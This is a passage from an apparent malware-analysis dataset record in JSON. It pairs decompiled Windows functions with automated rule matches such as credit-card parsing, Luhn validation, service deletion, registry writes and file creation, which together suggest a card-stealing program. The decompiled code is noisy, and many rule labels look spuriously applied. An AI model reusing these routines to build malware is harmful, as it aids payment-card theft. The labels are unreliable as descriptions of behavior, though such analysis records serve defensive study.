(bVar13);\n    if ((!bVar15) && (bVar15)) {\n        *unaff_EDI = uStack20;\n        return uStack20;\n    }\n    ppuVar9 = &uStack36;\n    ppuVar12 = arg_20h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *ppuVar12 = *ppuVar9;\n        ppuVar9 = ppuVar9 + 1;\n        ppuVar12 = ppuVar12 + 1;\n    }\n    if ((0x1f < uVar7) && (bVar15 != bVar14)) {\n        out(0xc4, puVar4);\n        *ppuVar12 = puVar4;\n        bVar13 = arg_20h >> 8 < *puVar4;\n    }\n    cVar3 = fcn.00404520(param_3, param_4, param_5, param_6, &uStack36, 0x20, arg_20h);\n    if ((bVar13) || (iVar5 = extraout_ECX,  uVar6 = extraout_EDX,  !bVar13)) {\n        iVar5 = param_8;\n        uVar6 = param_7;\n    }\n    *(ppuVar9 + 0x43d1773a) = *(ppuVar9 + 0x43d1773a) ^ 0x8b27e95e;\n    *(iVar5 + 0x52) = (*(iVar5 + 0x52) - uVar6) - (cVar3 + '\\r' + (bVar13 == false) < 0x8b);\n    fcn.00401d40(&uStack5);\n    return 1;\n}\n",
        "token_count": 1474
    },
    "004036c0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040386a) overlaps instruction at (ram,0x00403865)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403711)\n// WARNING: Removing unreachable block (ram,0x00403763)\n// WARNING: Removing unreachable block (ram,0x004037de)\n// WARNING: Removing unreachable block (ram,0x00403768)\n\nuint fcn.004036c0(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    int32_t unaff_EBX;\n    int32_t *piVar5;\n    char in_AF;\n    bool bVar6;\n    \n    piVar1 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    if (*0x4208c0 != 0) {\n        return 1;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    piVar5 = piVar1;\n    if ((-1 < iVar3) && (-1 >= iVar3)) {\n        out(0xc4, iVar3);\n        piVar5 = piVar1 + 1;\n        *piVar1 = iVar3;\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x4208b0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x4208b0 == 0) {\n        return 0;\n    }\n    iVar3 = (*piVar5)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x4208b8 = (*pcVar2)();\n    if (*0x4208b8 == 0) {\n        return 0;\n    }\n    iVar3 = (*piVar5)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar3 == 0) {\n        return 0;\n    }\n    *0x4208b4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x4208b4 == 0) {\n        return 0;\n    }\n    *0x4208a8 = (*pcVar2)();\n    bVar6 = *0x4208a8 == 0;\n    if (bVar6) {\n        return 0;\n    }\n    if ((!bVar6) && (bVar6)) {\n        unaff_EBX = unaff_EBX + 1;\n        if (unaff_EBX == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - unaff_EBX;\n        iVar3 = iVar3 + 1;\n    }\n    iVar4 = (*pcVar2)();\n    if (iVar4 != 0) {\n        *0x4208ac = iVar4;\n        if ((iVar4 < 1) || (0 < iVar4)) {\n            *0x4208bc = (*pcVar2)(iVar3, 0x420560);\n        }\n        else {\n            *(iVar4 + 0x6839da56) = *(iVar4 + 0x6839da56) ^ extraout_CL;\n            *0x4208bc = iVar4 - 0xa9ffbeU & 0xffffff00 | *(unaff_EBX + 1 + (iVar4 - 0xa9ffbeU & 0xff));\n        }\n        if (*0x4208bc != 0) {\n            *0x4208c0 = 1;\n            return 1;\n        }\n        return 0;\n    }\n    *0x4208ac = iVar4;\n    return 0;\n}\n",
        "token_count": 886
    },
    "00404470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404470(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401540;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x42088c;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "00401000": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(uint arg_8h)\n\n{\n    // [00] -r-x section size 16384 named .text\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 80
    },
    "00404880": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404880(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool bVar2;\n    uchar uVar3;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        iVar1 = unaff_EDI;\n    }\n    uVar3 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar3);\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar3);\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar3);\n    return 1;\n}\n",
        "token_count": 197
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.00404470(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00404760(argv),  pcVar2 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar1 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar1)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar2)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "00401540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401589) overlaps instruction at (ram,0x00401585)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __cdecl fcn.00401540(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_ECX_00;\n    uchar *puVar4;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool bVar5;\n    \n    puVar4 = &stack0xfffffffc;\n    bVar5 = arg_ch == 1;\n    if (bVar5) {\n        if (!in_CF) {\n            if (in_CF) {\n                out(0xbd, 0);\n                return;\n            }\n        }\n        iVar2 = fcn.00401e50();\n        if ((in_CF || bVar5) || (uVar3 = extraout_ECX,  !in_CF && !bVar5)) {\n            fcn.004041b0();\n            iVar2 = *0x4208a0;\n            uVar3 = extraout_ECX_00;\n        }\n        arg_ch = 5;\n        *unaff_EDI = *0x1;\n        puVar4 = 0xe8e181d0;\n        pcVar1 = (uVar3 & 0xffff0000 | CONCAT11(uVar3 >> 8 & *(&stack0xfffffff8 * 2), uVar3)) + 0x4208a0;\n        *pcVar1 = *pcVar1 + (&stack0xfffffff8 >> 8);\n        if (*0x10 == 0x8) {\n            *(iVar2 + -4) = 0;\n            (*_sym.imp.USER32.dll_PostQuitMessage)();\n            fcn.004049c0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(puVar4 + 8), arg_ch, *(puVar4 + 0x10), *(puVar4 + 0x14));\n    return;\n}\n",
        "token_count": 484
    },
    "004015c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004015c0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uchar uVar2;\n    bool bVar3;\n    ushort uVar4;\n    uchar uVar5;\n    uchar uVar6;\n    uchar uVar7;\n    \n    uVar2 = 0;\n    uVar7 = 0;\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    bVar3 = arg_8h_00 == '\\x01';\n    uVar4 = arg_8h_00;\n    uVar5 = arg_8h_00 >> 0x10;\n    uVar6 = arg_8h_00 >> 0x18;\n    fcn.00402940(arg_8h_00, arg_8h);\n    if ((!uVar2 && !bVar3) && (uVar2 || bVar3)) {\n        arg_8h = CONCAT13(uVar6, CONCAT12(uVar5, uVar4));\n    }\n    uVar1 = fcn.00404910(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00, uVar7);\n    return uVar1;\n}\n",
        "token_count": 298
    },
    "00401790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017d0) overlaps instruction at (ram,0x004017cc)\n// \n\nvoid __cdecl fcn.00401790(uint *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint8_t unaff_BL;\n    uchar *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    \n    puVar4 = &stack0xfffffffc;\n    uVar3 = 0;\n    bVar7 = false;\n    bVar9 = false;\n    bVar8 = arg_14h == 0;\n    if (0 < arg_14h) {\n        do {\n            if ((bVar9) || (!bVar9)) {\n                unaff_BL = *(uVar3 + arg_10h);\n                puVar5 = arg_10h;\n                puVar6 = arg_8h;\n                if (!bVar7 && !bVar8) goto code_r0x004017bc;\ncode_r0x004017d0:\n                unaff_BL = unaff_BL ^ *(uVar3 % *(puVar4 + 0xc) + puVar6);\n            }\n            else {\n                puVar2 = arg_14h + 1;\n                *arg_8h = *arg_10h;\n                *(puVar2 * 2) = 0x8a;\n                bVar7 = CARRY1(*puVar2, puVar2);\n                *puVar2 = *puVar2 + puVar2;\n                bVar8 = *puVar2 == 0;\n                arg_10h = arg_10h + 1;\n                arg_8h = arg_8h + 1;\ncode_r0x004017bc:\n                puVar5 = arg_10h;\n                puVar6 = arg_8h;\n                if (!bVar7 && !bVar8) goto code_r0x004017d0;\n                puVar6 = arg_8h + 1;\n                puVar5 = arg_10h + 1;\n                *arg_8h = *arg_10h;\n                puVar4 = 0x8be181d0;\n                uVar1 = *(uVar3 + 0x320c7df7);\n                *(uVar3 + 0x320c7df7) = uVar1 >> 0x1c | uVar1 << 5;\n            }\n            arg_14h = *(puVar4 + 0x14);\n            *(uVar3 + puVar5) = arg_14h ^ unaff_BL;\n            uVar3 = uVar3 + 1;\n            bVar7 = uVar3 < arg_14h;\n            bVar9 = SBORROW4(uVar3, arg_14h);\n            bVar8 = uVar3 == arg_14h;\n            arg_10h = puVar5;\n            arg_8h = puVar6;\n        } while (uVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 716
    },
    "00401810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017d8) overlaps instruction at (ram,0x004017d6)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00401870)\n// WARNING: Removing unreachable block (ram,0x004018ac)\n// WARNING: Removing unreachable block (ram,0x004018ae)\n// WARNING: Removing unreachable block (ram,0x004018ca)\n// WARNING: Removing unreachable block (ram,0x004018e1)\n// WARNING: Removing unreachable block (ram,0x004018e7)\n// WARNING: Removing unreachable block (ram,0x004018f3)\n\nuint8_t * __cdecl fcn.00401810(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint8_t **ppuVar3;\n    uint8_t *puVar4;\n    uint uVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *in_ECX;\n    uint8_t uVar8;\n    int32_t iVar9;\n    uint8_t unaff_BL;\n    uint8_t *puVar10;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_SS;\n    bool bVar11;\n    bool bVar12;\n    uint var_8h;\n    \n    bVar11 = (POPCOUNT(*0x4208a4 & 0xff) & 1U) == 0;\n    puVar6 = *0x4208a4;\n    if (*0x4208a4 == NULL) {\n        if ((!bVar11) && (bVar11)) {\n            ppuVar3 = segment(in_SS, *0x10 + -0xc);\n            puVar6 = *ppuVar3;\n            puVar10 = &stack0xfffffff4 & 0xffff0000 | *0x10 - 8;\n            if (bVar11) {\ncode_r0x004017d2:\n                iVar9 = puVar6 % *(unaff_EBP + 0xc);\n                unaff_BL = unaff_BL ^ *(iVar9 + unaff_EDI);\n                *(puVar10 + -4) = puVar6 / *(unaff_EBP + 0xc);\n                *(puVar10 + -6) = iVar9;\n                *(puVar10 + -2) = *(puVar10 + -6);\n                *(puVar10 + -6) = *(puVar10 + -4);\n                puVar4 = *(unaff_EBP + 0x14);\n                uVar8 = puVar4 ^ unaff_BL;\n                uVar5 = CONCAT31(iVar9 >> 8 & 0xffff00 | *(puVar10 + -2) >> 8, uVar8);\n                in_ECX[unaff_ESI] = uVar8;\n                puVar7 = in_ECX + 1;\n                bVar11 = puVar7 < puVar4;\n                bVar12 = puVar7 == puVar4;\n                if (puVar4 <= puVar7) {\n                    return puVar4;\n                }\n                puVar6 = puVar7;\n                if (SBORROW4(puVar7, puVar4)) goto code_r0x004017b3;\n                *(puVar10 + -4) = puVar7;\n                puVar6 = *(puVar10 + -4);\n                if (!SBORROW4(puVar7, puVar4)) goto code_r0x004017b3;\n                puVar4 = puVar4 + 1;\n                *unaff_EDI = *unaff_ESI;\n                uVar1 = *(puVar4 * 2);\n                *(puVar4 * 2) = 0x8a;\n                uVar5 = CONCAT31(0xf311c, uVar1);\n                bVar11 = CARRY1(*puVar4, puVar4);\n                *puVar4 = *puVar4 + puVar4;\n                bVar12 = *puVar4 == 0;\n                in_ECX = puVar6;\n                unaff_ESI = unaff_ESI + 1;\n                unaff_EDI = unaff_EDI + 1;\n                goto code_r0x004017bc;\n            }\n        }\n        uVar5 = (*_sym.imp.MSVCRT.dll_time)(0);\n        puVar6 = (*_sym.imp.MSVCRT.dll_srand)(uVar5);\n        *0x4208a4 = 0x1;\n    }\n    return puVar6;\ncode_r0x004017b3:\n    unaff_BL = puVar6[unaff_ESI];\n    in_ECX = puVar6;\n    if (puVar4 < puVar7) {\ncode_r0x004017bc:\n        puVar6 = in_ECX;\n        if (bVar11 || bVar12) {\n            *unaff_EDI = *unaff_ESI;\n            unaff_EBP = -0x741e7e30;\n            uVar2 = *(in_ECX + 0x320c7df7);\n            *(in_ECX + 0x320c7df7) = uVar2 >> 0x1c | uVar2 << 5;\n            *(puVar4 + -4) = uVar5;\n            puVar6 = puVar10;\n            puVar10 = puVar4 + -4;\n            unaff_ESI = unaff_ESI + 1;\n            unaff_EDI = unaff_EDI + 1;\n        }\n    }\n    goto code_r0x004017d2;\n}\n",
        "token_count": 1265
    },
    "00401d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d91) overlaps instruction at (ram,0x00401d8c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00401d40(uint param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint *arg_14h;\n    uchar *puVar3;\n    bool bVar4;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    puVar3 = &stack0xfffffffc;\n    uVar2 = fcn.00401310(param_1, param_2, auStack12, &uStack8);\n    if (uVar2 == 0) {\n        return 0;\n    }\n    iVar1 = uVar2;\n    bVar4 = iVar1 + 1 < 0;\n    *(uVar2 + 0x58) = uStack8;\n    if ((iVar1 == -1 || SCARRY2(iVar1, 1) != bVar4) || (iVar1 != -1 && SCARRY2(iVar1, 1) == bVar4)) {\n        arg_14h = &uStack8;\n    }\n    else {\n        *(uVar2 + 0x8b39da56) = *(uVar2 + 0x8b39da56) ^ uStack8;\n        arg_14h = uVar2 | 0x8d;\n        puVar3 = &stack0xfffffffd;\n        param_2 = uVar2;\n    }\n    fcn.00401310(*(puVar3 + 8), param_2, puVar3 + -8, arg_14h);\n    return 1;\n}\n",
        "token_count": 388
    },
    "00401dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401e19) overlaps instruction at (ram,0x00401e18)\n// \n\nbool fcn.00401dc0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint8_t *unaff_EBX;\n    char *pcVar5;\n    ulong uVar6;\n    char *var_4h;\n    \n    var_4h = NULL;\n    uVar6 = fcn.00403d40(&var_4h);\n    if (uVar6 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    if ((var_4h < 0) || (var_4h >= 0)) {\n        uVar3 = 0xffffffff;\n        pcVar5 = var_4h;\n        do {\n            pcVar4 = var_4h;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *(unaff_EBX + -0xd3fcc06) = *(unaff_EBX + -0xd3fcc06) + -1;\n        uVar3 = extraout_ECX;\n        pcVar4 = uVar6 >> 0x20;\n    }\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x420574, 0x4205b4, 1, pcVar4, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 424
    },
    "00402940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402990)\n\nuint __cdecl fcn.00402940(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(arg_8h, arg_ch, 0xf01ff);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 142
    },
    "004029d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402990)\n\nuint32_t __fastcall fcn.004029d0(int32_t param_1, char param_2, uint param_3)\n\n{\n    uchar *puVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t in_EAX;\n    uint *unaff_EDI;\n    uint8_t in_AF;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        iVar4 = fcn.00403e20(param_3, 1);\n        return iVar4 != 0;\n    }\n    uVar3 = 9 < (in_EAX & 0xf) | in_AF;\n    if (param_1 != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar5 = in_EAX & 0xffff0000 | (in_EAX >> 8) + uVar3 << 8 | in_EAX + uVar3 * '\\x06' & 0xf | 0x8b;\n    puVar1 = uVar5 - 1;\n    *puVar1 = *puVar1;\n    *unaff_EDI = *unaff_EDI;\n    pcVar2 = uVar5 + 0x51;\n    *pcVar2 = *pcVar2 + param_2;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar4 != 0) {\n        uVar5 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar4);\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar4);\n        return uVar5;\n    }\n    return 0;\n}\n",
        "token_count": 428
    },
    "00402c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d71) overlaps instruction at (ram,0x00402d70)\n// \n// WARNING: Removing unreachable block (ram,0x00402d71)\n\nuint fcn.00402c90(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *extraout_ECX;\n    uchar *arg_ch;\n    int32_t extraout_EDX;\n    uchar *puVar3;\n    uint *puVar4;\n    uchar uVar5;\n    char cVar6;\n    char cVar7;\n    uchar uStack532;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [7];\n    uchar uStack5;\n    \n    puVar3 = &stack0xfffffffc;\n    uStack532 = 0;\n    puVar4 = &uStack531;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    uStack272 = 0;\n    puVar4 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    cVar7 = '\\0';\n    cVar6 = '\\0';\n    uVar5 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&uStack532, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0x420394, &uStack532, param_1);\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        cVar7 = SBORROW4(&stack0xfffffffc, 1);\n        puVar3 = &uStack5;\n        cVar6 = puVar3 < 0;\n        uVar5 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n        arg_ch = extraout_ECX;\n    }\n    else {\n        arg_ch = auStack12;\n    }\n    fcn.00403c20(puVar3 + -4, arg_ch);\n    if ((uVar5) || (!uVar5)) {\n        iVar2 = *(puVar3 + -4);\n    }\n    else {\n        iVar2 = extraout_EDX + 1;\n        cVar7 = SCARRY4(*0x8b17b43a, 1);\n        puVar3 = *0x8b17b43a + 1;\n        cVar6 = puVar3 < 0;\n    }\n    uVar1 = fcn.00402dd0(iVar2);\n    if ((cVar7 == cVar6) && (cVar7 != cVar6)) {\n        out(0xc4, uVar1);\n        *(puVar4 + 3) = uVar1;\n    }\n    iVar2 = fcn.00404880(puVar3 + -0x10c, 0x4203b4, *(puVar3 + -4), *(puVar3 + -8));\n    if (iVar2 != 0) {\n        fcn.00401640(puVar3 + -0x10c, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 823
    },
    "00402fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040316e) overlaps instruction at (ram,0x0040316d)\n// \n// WARNING: Removing unreachable block (ram,0x004030a9)\n// WARNING: Removing unreachable block (ram,0x0040316e)\n\nulong __cdecl fcn.00402fa0(uint noname_0, uint noname_1, uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char cVar5;\n    char *in_EAX;\n    uint uVar4;\n    uint16_t uVar6;\n    int32_t in_ECX;\n    uint32_t in_EDX;\n    uint8_t uVar7;\n    ushort *unaff_EBX;\n    uint **ppuVar8;\n    uint *puVar9;\n    uint **unaff_EBP;\n    char *unaff_ESI;\n    char *pcVar10;\n    char **unaff_EDI;\n    char **ppcVar11;\n    ushort in_SS;\n    ushort in_DS;\n    uint8_t uVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    uchar in_SF;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    char *var_8h;\n    uint uStack20;\n    uint16_t uStack16;\n    char *pcStack12;\n    uint *puStack4;\n    \n    pcStack12 = unaff_ESI;\ncode_r0x00402fa0:\n    ppuVar8 = &puStack4;\n    puStack4 = unaff_EBP;\n    uStack16 = unaff_EDI;\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        in_DS = uStack16;\n        in_ST0 = in_ST1;\n        in_ST1 = in_ST2;\n        in_ST2 = in_ST3;\n        in_ST3 = in_ST4;\n        in_ST4 = in_ST5;\n        in_ST5 = in_ST6;\n        in_ST6 = in_ST7;\n    }\n    *var_8h = -0x48;\n    uVar6 = in_ECX + 1;\n    uVar12 = false;\n    in_SF = false;\n    bVar14 = ((uVar6 & 0xff | (uVar6 >> 8 & in_EAX + 2U) << 8) & 0x7bc9) == 0;\n    bVar13 = (POPCOUNT(uVar6 & 0xc9) & 1U) == 0;\n    var_8h[1] = '9';\n    unaff_EBP = &puStack4;\n    if ((!bVar14) && (unaff_EBP = &puStack4,  bVar14)) {\n        puVar9 = &uStack16;\n        unaff_EBP = &uStack16;\n        cVar2 = '\\x10';\n        do {\n            ppuVar8 = ppuVar8 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *ppuVar8;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    var_8h[2] = -0x24;\n    if (bVar13) goto code_r0x00403018;\n    do {\n        in_EAX = pcStack12;\n        if (bVar13) {\n            ppcVar11 = segment(in_SS, *0x10 + -0xc);\n            in_EAX = *ppcVar11;\n            in_EDX = 0xb7bc9ea5;\n            if (!uVar12) {\n                pcStack12 = var_8h;\n                if (!bVar13) {\n                    uVar12 = false;\n                    bVar14 = *0x10 == 0x8;\n                    in_EAX = in_EAX;\n                    pcStack12 = 0xb7bc9ea5;\n                    goto code_r0x00403018;\n                }\n                goto code_r0x00402fa0;\n            }\n        }\n        else {\ncode_r0x00403018:\n            var_8h[3] = '1';\n            if ((!uVar12 && !bVar14) && (uVar12 || bVar14)) {\n                in_EAX = in_EAX & 0xe2f4cc58;\n            }\n            var_8h[4] = 'i';\n        }\n        var_8h[5] = 'I';\n        var_8h[6] = '\\x7f';\n        uVar12 = unaff_EBX >> 8;\n        uVar7 = uVar12 ^ 0x16 | in_EAX >> 8;\n        cVar5 = in_EDX >> 8;\n        cVar2 = uVar7 - cVar5;\n        in_SF = cVar2 < '\\0';\n        bVar14 = cVar2 == '\\0';\n        bVar13 = (POPCOUNT(cVar2) & 1U) == 0;\n        var_8h[7] = '\\x10';\n        if ((bVar14 || uVar7 < cVar5) || (!bVar14 && cVar5 <= uVar7)) {\n            var_8h[8] = -0x50;\n            ppcVar11 = unaff_EDI;\n            if ((cVar5 <= uVar7) && (uVar7 < cVar5)) {\n                out(0xc4, in_EAX);\n                in_EDX = in_EDX & 0xffffff00 | in_EDX ^ in_ECX;\n                ppcVar11 = unaff_EDI + 1;\n                *unaff_EDI = in_EAX;\n                bVar13 = (POPCOUNT(uVar12 - *in_EAX) & 1U) == 0;\n            }\n            var_8h[9] = '\\x06';\n            if ((!bVar13) && (bVar13)) {\n                puVar9 = &uStack16;\n                cVar2 = '\\x1e';\n                do {\n                    unaff_EBP = unaff_EBP + -1;\n                    puVar9 = puVar9 + -1;\n                    *puVar9 = *unaff_EBP;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                uVar4 = in(0x78);\n                return 